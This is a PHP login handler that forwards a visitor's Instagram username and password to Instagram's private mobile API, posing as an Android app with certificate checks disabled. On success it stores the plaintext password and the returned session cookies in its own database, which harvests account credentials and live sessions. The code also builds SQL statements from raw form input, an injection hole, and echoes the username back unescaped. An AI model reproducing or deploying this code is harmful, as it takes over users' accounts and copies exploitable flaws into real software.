<?php
            session_start();
            include 'conn.php';
            $isUserLoggedIn = isset($_SESSION['username']  ) ? true : false;

if ($isUserLoggedIn) {    
                 // Is Login Done 
         header("Location: home.php");
    exit;
}     
   

if (empty($_POST['Username'])  && empty($_POST['Password']) ) {

   if( isset($_POST['Username']) == ' ' &  isset($_POST['Password']) == ' ' ) {

       $msg = "<p style='color:red;'> Please write your username and password.</p>  <br>";
       echo json_encode(['status'=>'error', 'msg'=>$msg]);
       exit;

   } 


}else {
   $Username = $_POST['Username'];
   $Password = $_POST['Password'];
   echo login($Username,$Password);
}

  


function login($Username,$Password)
{
   $url = "https://i.instagram.com/api/v1/accounts/login/";
   $hasss = hash_hmac("sha256","{\"phone_id\":\"","5ad7d6f013666cc93c88fc8af940348bd067b68f0dce3c85122a923f4f74b251").".";
   $postVars = array(
       'signed_body' => $hasss.'{"phone_id":"'.GUID().'","username":"'.$Username.'","guid":"'.GUID().'","device_id":"android-'.GUID().'","password":"'
           .$Password.'","login_attempt_count":"0"}',
       'ig_sig_key_version'=>'5'
   );
   
   $postStr = http_build_query($postVars);
   $options = array(
       'http' =>
           array(
               'ignore_errors' => true,
               'method'  => 'POST',
               'header'  => 'Content-type: application/x-www-form-urlencoded; charset=UTF-8',
               'content' => $postStr,
               'user_agent'=>'Instagram 10.3.2 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)'
               ),
           'ssl'=>
           array(
               'verify_peer'=>false,
               'verify_peer_name'=>false,
           )
   );

   $streamContext  = stream_context_create($options);

   $result = file_get_contents($url, false, $streamContext);
   if(strpos($result,'"status": "ok"') === false)
   {
       
       $Array = json_decode($result);
       $msgJeson  = $Array->message;
       $msg = "<p style='color:red;'> "  .  $msgJeson . "</p>  <br>";
       echo json_encode(['status'=>'error', 'msg'=>$msg]);
       exit;
   }
   else {
       $cookies = array();
       foreach ($http_response_header as $hdr) {
           if (preg_match('/^Set-Cookie:\s*([^;]+)/', $hdr, $matches)) {
               parse_str($matches[1], $tmp);
               $cookies += $tmp;
           }
       }
       $cookiesStr = "";
       foreach($cookies as $key => $value) {
           $cookiesStr = $cookiesStr.$key.'='.$value.';';
           
            
                  
       }

  //     Successful login  Run Code

    include 'conn.php';   
    $_SESSION['username'] = $Username;

    $sql = "SELECT username FROM username where username = '$Username' ";
    $result = $conn->query($sql);
    if ($result->num_rows == 0) {

      $sql = "INSERT INTO username (username, password, cookie ,time )
      VALUES ('$Username', '$Password', '$cookiesStr' , now() ) ";
      $conn->query($sql);
      $conn->close();
      $msg = "<p style='color:#4CAF50;'> Successful login .</p>  <br>"; 
      echo json_encode(['status'=>'done', 'msg'=>$msg]);

  } else {

    $sql = "UPDATE username  SET  password = '$Password', cookie = '$cookiesStr'  ,time = now()  WHERE username = '$Username' ";
    $conn->query($sql);
    $conn->close();
    $msg = "<p style='color:#4CAF50;'> Welcome Back " . $Username . " login .</p>  <br>"; 
    echo json_encode(['status'=>'done', 'msg'=>$msg]);

  }
   

    exit;
    // end Login Ssc
   }
  

   return $result;
   
}
function GUID()
{
   if (function_exists('com_create_guid') === true)
   {
       return trim(com_create_guid(), '{}');
   }

   return sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X', mt_rand(0, 65535),
    mt_rand(0, 65535), mt_rand(0, 65535), 
    mt_rand(16384, 20479), mt_rand(32768, 49151), 
    mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535));
}
?>